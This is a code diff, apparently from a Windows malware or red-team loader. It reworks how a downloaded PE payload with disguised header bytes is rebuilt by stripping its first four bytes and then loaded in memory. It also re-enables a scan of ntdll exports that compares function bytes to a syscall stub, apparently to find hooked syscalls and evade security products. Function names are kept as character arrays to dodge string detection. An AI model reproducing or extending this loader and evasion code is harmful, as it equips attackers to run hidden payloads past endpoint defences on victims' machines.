@@ -26,6 +26,7 @@ unsigned char sNtdllDefWindowProc_W[] = { 'N','t','d','l','l','D','e','f','W','i
 unsigned char sNtdllDialogWndProc_A[] = { 'N','t','d','l','l','D','i','a','l','o','g','W','n','d','P','r','o','c','_','A', 0x0 };
 unsigned char sNtdllDialogWndProc_W[] = { 'N','t','d','l','l','D','i','a','l','o','g','W','n','d','P','r','o','c','_','W', 0x0 };
 
+
 /*
 struct structure {
 
@@ -234,20 +235,63 @@ int GET_PE()
     printf("Size of PE data => %d\n", size);
 
 
-    // Updating: 90 to M (1st byte)
+    // Updating 1st 2bytes: M and Z
 
-    unsigned char update = 'M';
+    //unsigned char update1 = 'M';
+    //unsigned char update2 = 'Z';
 
+    bufdata = (char*)malloc(size-4);
+    int j = 0;
+    for (int i = 4; i < (buffer.size()-4); i++)
+    {
+        bufdata[j] = buffer[i];
+
+        if(j == 0)
+        {
+            printf("1st byte of downloaded PE: %c\n", buffer[j]);
+            printf("1st byte of actual PE: %c\n", bufdata[j]);
+        }
+
+        if(j == 1)
+        {
+            printf("2nd byte of downloaded PE: %c\n", buffer[j]);
+            printf("2nd byte of actual PE: %c\n", bufdata[j]);
+        }
+
+        if(j == 2)
+        {
+            printf("3rd byte of downloaded PE: %c\n", buffer[j]);
+        }
+
+        if(j == 3)
+        {
+            printf("4th byte of downloaded PE: %c\n", buffer[j]);
+        }
+
+        j++;
+    }
+
+
+    /*
     for (int i = 0; i < buffer.size(); i++)
     {
     	if(i == 0)
     	{
     		printf("1st byte of PE: %c\n", buffer[i]);
 
-    		printf("Updating it to: %c\n", update);
-    		bufdata[i] = update;
+    		printf("Updating it to: %c\n", update1);
+    		bufdata[i] = update1;
     	}
+
+        if(i == 1)
+        {
+            printf("2nd byte of PE: %c\n", buffer[i]);
+
+            printf("Updating it to: %c\n", update2);
+            bufdata[i] = update2;
+        }
     }
+    */
 
     // ==========================================
     // Call Load_PE and then send the pointer to the address and the size of the pe payload
@@ -518,6 +562,7 @@ int main()
 		// Pre fix: Post fix was picking addr of the next function (ptr/offset to the next function) than the current function that we are actually going to print
 		char* addr = (char*)((DWORD64)BaseAddr + *(DWORD*)++addrFunction);
 		
+        /*
 		// Only those Which starts with `Nt` and `Zw`
 		if (strncmp(name, (char *)sNt, 2) == 0 || strncmp(name, (char *)sZw, 2) == 0)
         {
@@ -536,7 +581,8 @@ int main()
         		}
         	}
 		}
-		/*
+        */
+
 		// Neglecting False-Positives
     	if (memcmp(addr, syscallstub, 4) != 0)
     	{
@@ -551,7 +597,6 @@ int main()
     			printf("\t %s [addr: %p]\n", name, addr);
     		}
     	}
-    	*/
 	}
 
 	printf("Press Enter to Exit Prompt... "); getchar();
